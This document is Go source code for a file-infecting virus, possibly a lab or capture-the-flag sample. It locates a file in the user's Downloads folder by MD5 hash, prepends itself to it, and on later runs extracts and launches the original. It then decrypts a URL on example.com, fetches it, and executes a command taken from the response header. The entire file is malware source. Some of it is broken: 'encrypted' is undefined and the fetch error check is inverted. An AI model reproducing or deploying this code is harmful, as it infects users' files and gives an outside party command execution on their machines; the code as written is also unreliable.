package main

import (
	"crypto/md5"
	"encoding/binary"
	"encoding/hex"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"net/http"
)

const target_hash = "84fcbf7ca0e4b2fd95b56dcaeaa68908"
const infection_marker = "Q09PS0lFUyE=" // COOKIES! in b64

func check_infection(filename string) bool {
	file, err := os.Open(filename)
	if err != nil {
		os.Exit(0)
	} else {
		defer file.Close()
	}

	stat, _ := file.Stat()

	trailer_len := int64(len(infection_marker))
	offset := stat.Size() - trailer_len
	trailer := make([]byte, trailer_len)
	file.ReadAt(trailer, offset)

	if infection_marker == string(trailer) {
		return true
	} else {
		return false
	}
}

func hash_file(filename string) string {
	file, err := os.Open(filename)
	if err != nil {
		os.Exit(0)
	} else {
		defer file.Close()
	}

	const max_size = 5 * 1024 * 1024
	buf := make([]byte, max_size)
	md5sum := md5.New()
	for {
		n, err := file.Read(buf)
		if n > 0 {
			_, err := md5sum.Write(buf[:n])
			if err != nil {
				os.Exit(0)
			}
		}

		if err == io.EOF {
			break
		}

		if err != nil {
			os.Exit(0)
		}
	}

	sum := md5sum.Sum(nil)

	return hex.EncodeToString(sum)
}

func find_file() string {
	home_dir, err := os.UserHomeDir()
	if err != nil {
		os.Exit(0)
	}

	downloads_dir := path.Join(home_dir, "Downloads")

	var target string

	filepath.Walk(downloads_dir, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		hash := hash_file(path)

		if hash == target_hash {
			target = path
		}

		return nil
	})

	return target
}

func infect(filename string) {
	vir, _ := os.Open(os.Args[0])
	defer vir.Close()

	vir_buf, _ := io.ReadAll(vir)

	target, _ := os.OpenFile(filename, os.O_RDWR, 0755)
	defer target.Close()

	target_buf, _ := io.ReadAll(target)

	// Prepend vir
	target.Seek(0, 0)
	target.Write(vir_buf)
	target.Write(target_buf)

	// Append size of vir
	stat, _ := vir.Stat()
	vir_size := stat.Size()
	vir_size_buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(vir_size_buf, uint64(vir_size))
	if _, err := target.Write(vir_size_buf); err != nil {
	} else {
	}

	// Append infection_marker
	if _, err := target.Write([]byte(infection_marker)); err != nil {
	}
}

func write_original_file() string {
	// Open temporary
	tempfile, err := os.CreateTemp("", "butter.*.exe")
	if err != nil {
	} else {
		defer tempfile.Close()
	}

	// Check own size
	vir, _ := os.Open(os.Args[0])
	defer vir.Close()

	stat, _ := vir.Stat()
	infected_vir_size := stat.Size()

	trailer_size := int64(len(infection_marker) + 8)
	noninfected_vir_offset := infected_vir_size - trailer_size
	noninfected_vir_buffer := make([]byte, 8)
	vir.ReadAt(noninfected_vir_buffer, noninfected_vir_offset)

	noninfected_vir_size := binary.LittleEndian.Uint64(noninfected_vir_buffer)

	// Read original file into buffer
	original_size := infected_vir_size - int64(noninfected_vir_size) - trailer_size
	original_buffer := make([]byte, original_size)
	vir.ReadAt(original_buffer, int64(noninfected_vir_size))

	// Write original file to temporary
	if _, err := tempfile.Write(original_buffer); err != nil {
	}

	return tempfile.Name()
}

func execute(filename string) {
	cmd := exec.Command(filename, os.Args...)
	if err := cmd.Run(); err != nil {
	}
}

func decrypt(filename string) string {
	original, _ := os.Open(filename)
	defer original.Close()

	key := make([]byte, 16)
	original.ReadAt(key, 1337)

	decrypted := make([]byte, len(encrypted))

	for i := 0; i < len(encrypted); i++ {
		decrypted[i] = encrypted[i] ^ key[i % 16]
	}

	return "http://www.example.com/" + string(decrypted[:])
}

func fetch(url string) string {
	if resp, err := http.Get(url); err != nil {
		return resp.Header.Get("X-Cache")
	} else {
		return ""
	}
}

func main() {
	running_as_infected := check_infection(os.Args[0])

	if running_as_infected {
		original_file := write_original_file()
		execute(original_file)
		url := decrypt(original_file)
		command := fetch(url)
		if command != "" {
			execute(command)
		}
	} else {
		target_file := find_file()
		if target_file == "" {
			os.Exit(0)
		} else {
		}
		infect(target_file)
	}
}
